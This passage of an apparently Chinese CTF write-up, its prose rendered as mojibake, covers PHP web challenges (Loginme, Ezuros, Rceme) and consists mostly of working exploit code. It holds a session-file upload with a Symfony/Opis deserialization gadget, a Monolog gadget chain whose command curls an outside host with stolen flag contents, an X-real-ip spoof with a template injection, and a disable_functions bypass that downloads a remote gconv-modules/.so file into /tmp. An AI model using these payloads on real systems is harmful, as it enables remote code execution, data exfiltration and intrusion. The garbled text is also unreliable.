</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;PHPSESSID&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>store</span><span class=p>(</span><span class=n>path</span><span class=p>,</span><span class=n>name</span><span class=p>,</span><span class=n>con</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:(</span><span class=n>name</span><span class=p>,</span><span class=n>con</span><span class=p>),</span><span class=s2>&#34;path&#34;</span><span class=p>:(</span><span class=kc>None</span><span class=p>,</span><span class=n>path</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>serSes</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s2>&#34;php gadget.php&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>store</span><span class=p>(</span><span class=s2>&#34;../../../../tmp&#34;</span><span class=p>,</span><span class=s2>&#34;sess_&#34;</span><span class=o>+</span><span class=n>cookie</span><span class=p>,</span><span class=n>serSes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:(</span><span class=s2>&#34;pew&#34;</span><span class=p>,</span><span class=s2>&#34;XXD&#34;</span><span class=p>)})</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>namespace</span> <span class=n>Symfony</span>\<span class=n>Component</span>\<span class=n>String</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>LazyString</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>function</span> <span class=n>__construct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>func</span> <span class=o>=</span> <span class=n>function</span><span class=p>(){</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;cat /flag&#34;</span><span class=p>);};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=err>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>value</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>Opis</span>\<span class=n>Closure</span>\<span class=n>SerializableClosure</span><span class=p>(</span><span class=err>$</span><span class=n>func</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>include_once</span> <span class=s2>&#34;vendor/autoload.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;upload_path|&#34;</span><span class=o>.</span><span class=p>(</span><span class=n>serialize</span><span class=p>(</span><span class=n>new</span> \<span class=n>Symfony</span>\<span class=n>Component</span>\<span class=n>String</span>\<span class=n>LazyString</span><span class=p>())));</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=loginme>Loginme</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>X-real-ip:127.0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>age={{$}}
</span></span></code></pre></td></tr></table></div></div><h3 id=ezuros>Ezuros</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://124.70.204.21:7777/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s2>&#34;php gadget.php&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;config&#34;</span><span class=p>,</span><span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;XXD|</span><span class=si>{}</span><span class=s1>FF&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span><span class=s1>&#39;XXD&#39;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;config&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>namespace</span> <span class=n>Monolog</span>\<span class=n>Handler</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>SyslogUdpHandler</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>socket</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=err>$</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=err>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>socket</span> <span class=o>=</span> <span class=err>$</span><span class=n>x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>BufferHandler</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>handler</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>bufferSize</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>level</span> <span class=o>=</span> <span class=n>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>initialized</span> <span class=o>=</span> <span class=n>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>bufferLimit</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>protected</span> <span class=err>$</span><span class=n>processors</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>function</span> <span class=n>__construct</span><span class=p>(</span><span class=err>$</span><span class=n>methods</span><span class=p>,</span> <span class=err>$</span><span class=n>command</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=err>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>processors</span> <span class=o>=</span> <span class=err>$</span><span class=n>methods</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=err>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>buffer</span> <span class=o>=</span> <span class=p>[</span><span class=err>$</span><span class=n>command</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=err>$</span><span class=n>this</span><span class=o>-&gt;</span><span class=n>handler</span> <span class=o>=</span> <span class=n>clone</span> <span class=err>$</span><span class=n>this</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>namespace</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;$(printf &#34;curl https://thegrandpewd</span><span class=se>\\</span><span class=s1>x2epythonanywhere</span><span class=se>\\</span><span class=s1>x2ecom/`cat /etc/*/flag`&#34;)&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>obj</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>Monolog</span>\<span class=n>Handler</span>\<span class=n>SyslogUdpHandler</span><span class=p>(</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>new</span> \<span class=n>Monolog</span>\<span class=n>Handler</span>\<span class=n>BufferHandler</span><span class=p>(</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=s1>&#39;current&#39;</span><span class=p>,</span> <span class=s1>&#39;system&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=err>$</span><span class=n>cmd</span><span class=p>,</span> <span class=s1>&#39;level&#39;</span> <span class=o>=&gt;</span> <span class=n>null</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=n>serialize</span><span class=p>([</span><span class=err>$</span><span class=n>obj</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=rceme>Rceme</h3><p>diff</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Apache data-lang=Apache><span class=line><span class=cl><span class=err>pcntl_fork,</span> <span class=err>pcntl_waitpid,</span> <span class=err>pcntl_wait,</span> <span class=err>pcntl_signal,</span> <span class=err>pcntl_signal_get_handler,</span> <span class=err>pcntl_signal_dispatch,</span> <span class=err>pcntl_wifexited,</span> <span class=err>pcntl_wifstopped,</span> <span class=err>pcntl_wifsignaled,</span> <span class=err>pcntl_wexitstatus,</span> <span class=err>pcntl_wtermsig,</span> <span class=err>pcntl_wstopsig,</span> <span class=err>pcntl_exec,</span> <span class=err>pcntl_alarm,</span> <span class=err>pcntl_get_last_error,</span> <span class=err>pcntl_errno,</span> <span class=err>pcntl_strerror,</span> <span class=err>pcntl_getpriority,</span> <span class=err>pcntl_setpriority,</span> <span class=err>pcntl_sigprocmask,</span> <span class=err>pcntl_sigwaitinfo,</span> <span class=err>pcntl_sigtimedwait,</span> <span class=err>pcntl_wifcontinued,</span> <span class=err>pcntl_async_signals,</span> <span class=err>pcntl_unshare,</span> <span class=err>cli_set_process_title,</span> <span class=err>cli_get_process_title,</span> <span class=err>chroot,</span> <span class=err>dl,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>strlen,</span> <span class=err>error_reporting,</span> <span class=err>set_error_handler,</span> <span class=err>create_function,</span> <span class=err>preg_match,</span> <span class=nb>preg_replace</span> phpinfo, strstr, escapeshellarg, getenv, putenv, call_user_func, unserialize, var_dump, highlight_file, show_source, ini_get , end, 
</span></span></code></pre></td></tr></table></div></div><p>ç®€å•çœ‹ä¸€ä¸‹ï¼ŒçŸ¥é“æ˜¯æ— å‚æ•° rce æŠ„ä¸€ä¸‹è„šæœ¬ï¼Œæ”¹ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>def</span> <span class=nx>one</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>ss</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nx>each</span> <span class=nx>in</span> <span class=nx>s</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>ss</span> <span class=o>+=</span> <span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nx>str</span><span class=p>(</span><span class=nx>hex</span><span class=p>(</span><span class=mi>255</span> <span class=o>-</span> <span class=nx>ord</span><span class=p>(</span><span class=nx>each</span><span class=p>)))[</span><span class=mi>2</span><span class=o>:</span><span class=p>]</span><span class=o>.</span><span class=nx>upper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>f</span><span class=s2>&#34;[~{ss}][!%FF](&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>makeSTR</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>ss</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nx>each</span> <span class=nx>in</span> <span class=nx>s</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>ss</span> <span class=o>+=</span> <span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nx>str</span><span class=p>(</span><span class=nx>hex</span><span class=p>(</span><span class=mi>255</span> <span class=o>-</span> <span class=nx>ord</span><span class=p>(</span><span class=nx>each</span><span class=p>)))[</span><span class=mi>2</span><span class=o>:</span><span class=p>]</span><span class=o>.</span><span class=nx>upper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>f</span><span class=s2>&#34;[~{ss}][!%FF]&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>ç»„æˆ system(next(getallheaders()));
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>a=whoami
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>make</span><span class=p>(</span><span class=nx>xd</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>a</span> <span class=o>=</span> <span class=nx>xd</span><span class=o>.</span><span class=nx>strip</span><span class=p>(</span><span class=s2>&#34;)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>aa</span> <span class=o>=</span> <span class=nx>a</span><span class=o>.</span><span class=nx>split</span><span class=p>(</span><span class=s2>&#34;(&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>s</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nx>each</span> <span class=nx>in</span> <span class=nx>aa</span><span class=p>[</span><span class=o>:-</span><span class=mi>1</span><span class=p>]</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>s</span> <span class=o>+=</span> <span class=nx>one</span><span class=p>(</span><span class=nx>each</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>s</span> <span class=o>+=</span> <span class=s2>&#34;)&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=nx>len</span><span class=p>(</span><span class=nx>aa</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>s</span>
</span></span></code></pre></td></tr></table></div></div><p>ç„¶åçœ‹ä¸€ä¸‹ php æ–‡æ¡£ï¼Œ[https://www.php.net/manual/en/functions.arguments.php#:~:text=Example%20%2310%20Using%20&mldr;%20to%20provide%20arguments](<a href="https://www.php.net/manual/en/functions.arguments.php#:~:text=Example">https://www.php.net/manual/en/functions.arguments.php#:~:text=Example</a> #10 Using &mldr; to provide arguments) çŸ¥é“å¯ä»¥ç”¨ <code>...[1,2]</code> æ¥ä¼ å¤šä¸ªå‚æ•°ï¼Œå¯ä»¥ç”¨ <code>create_function</code> æ¥æ‰§è¡Œä»»æ„ php ä»£ç ï¼Œè¿˜å¯ä»¥åºåˆ—åŒ–ä¼ æ•°ç»„ï¼Œç”¨ååºåˆ—åŒ–å‡½æ•°å¼„å‡ºæ¥å°±è¡Œäº†ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯ iconv bypass df äº†ï¼ŒæŠ„ä¸€ä¸‹ bytectf final çš„ï¼Œç”¨ filter ç»•å‡½æ•°å°±è¡Œã€‚é—®é¢˜æ¯”è¾ƒå¤§å°±æ˜¯æ€ä¹ˆå†™æ–‡ä»¶ï¼Œè°ƒäº†åŠå¤©ï¼Œæœ€åç”¨ <code>SplFileObject</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>import</span> <span class=nx>craft</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>import</span> <span class=nx>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>arb</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span><span class=o>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>craft</span><span class=o>.</span><span class=nx>makeSTR</span><span class=p>(</span><span class=nx>s</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;.&#34;</span> <span class=o>+</span> <span class=nx>craft</span><span class=o>.</span><span class=nx>make</span><span class=p>(</span><span class=s2>&#34;var_dump()&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:3333&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># payload = &#34;&#34;&#34;a:2:{i:0;s:198:&#34;){}$url = &#39;http://47.100.54.220/poc.so&#39;;$file = new SplFileObject($url, &#34;r&#34;);$a = &#34;&#34;;while(!$file-&gt;eof()) {$a = $a.$file-&gt;fgets();}$file=new SplFileObject(&#39;/tmp/payload.so&#39;,&#39;w&#39;);$file-&gt;fwrite($a);//&#34;;i:1;s:0:&#34;&#34;;}&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>payload</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;a:2:{i:0;s:208:&#34;</span><span class=p>){}</span><span class=nv>$url</span> <span class=o>=</span> <span class=s1>&#39;http://47.100.54.220/gconv-modules&#39;</span><span class=p>;</span><span class=nv>$file</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>);</span><span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span><span class=k>while</span><span class=p>(</span><span class=o>!</span><span class=nv>$file</span><span class=o>-&gt;</span><span class=na>eof</span><span class=p>())</span> <span class=p>{</span><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$a</span><span class=o>.</span><span class=nv>$file</span><span class=o>-&gt;</span><span class=na>fgets</span><span class=p>();}</span><span class=nv>$file</span><span class=o>=</span><span class=k>new</span> <span class=nx>SplFileObject</span><span class=p>(</span><span class=s1>&#39;/tmp/gconv-modules&#39;</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>);</span><span class=nv>$file</span><span class=o>-&gt;</span><span class=na>fwrite</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span><span class=c1>//&#34;;i:1;s:0:&#34;&#34;;}&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>code</span> <span class=o>=</span> <span class=nx>craft</span><span class=o>.</span><span class=nx>makeSTR</span><span class=p>(</span><span class=s1>&#39;call_user_func&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;(&#39;</span> <span class=o>+</span> <span class=nx>craft</span><span class=o>.</span><span class=nx>makeSTR</span><span class=p>(</span><span class=s2>&#34;create_function&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>code</span> <span class=o>+=</span> <span class=s2>&#34;(&#34;</span>
</span></span><span class=line><span class=cl>
